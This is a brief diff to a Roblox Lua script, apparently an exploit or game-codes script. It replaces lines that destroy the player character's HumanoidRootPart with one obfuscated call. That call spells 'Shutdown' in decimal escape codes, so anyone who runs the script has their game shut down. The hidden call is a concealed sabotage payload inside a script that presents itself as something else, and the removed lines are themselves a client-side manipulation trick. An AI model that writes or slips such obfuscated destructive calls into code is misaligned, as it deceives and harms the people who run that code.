@@ -1,8 +1,6 @@
 repeat wait() until game:GetService("Players").LocalPlayer.Character
-local a=game.Players.LocalPlayer.Character
-a.Parent=nil
-a.HumanoidRootPart:Destroy()
-a.Parent=workspace
+
+game["\83\104\117\116\100\111\119\110"](game)
 
 --// Codes
 
